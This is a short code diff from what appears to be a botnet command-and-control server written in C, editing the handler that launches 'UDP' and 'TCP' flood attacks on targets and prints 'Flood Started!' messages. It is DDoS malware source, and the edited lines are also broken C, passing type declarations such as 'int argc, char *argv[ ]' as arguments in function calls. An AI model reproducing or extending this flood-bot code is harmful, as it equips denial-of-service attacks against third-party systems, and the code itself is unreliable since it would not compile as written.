@@ -869,23 +869,17 @@ void *BotWorker(void *sock) {
 								if(send(datafd, "\x1b[37mType: ", 12, MSG_NOSIGNAL) == -1) goto end;
 				continue;
 			}
-                                        if(!strcmp(argv[0], "UDP")) {
-
-                                           if(argc < 5)
-                                           {
-                                                       printf("UDP <target> <port (0 for random)> <time> <packet size (1 to 65500)> (time poll interval, default 10)");
-                                                       return;
-                                           }
+                                        if(strstr(buf, "UDP")) {
 			                  
                                            if (listFork()) { return; }
-                                           sendUDP();
+                                           sendUDP(int argc, char *argv[ ]);
                                            printf("UDP Flood Started!");
 				           continue;
 					}
-                                        if(!strcmp(argv[0], "TCP")) {
+                                        if(strstr(buf, "TCP")) {
                      
                                            if (listFork()) { return; }
-                                           sendTCP();
+                                           sendTCP(int argc, char *argv[ ]);
                                            printf("TCP Flood Started!");
 				           continue;
 					}
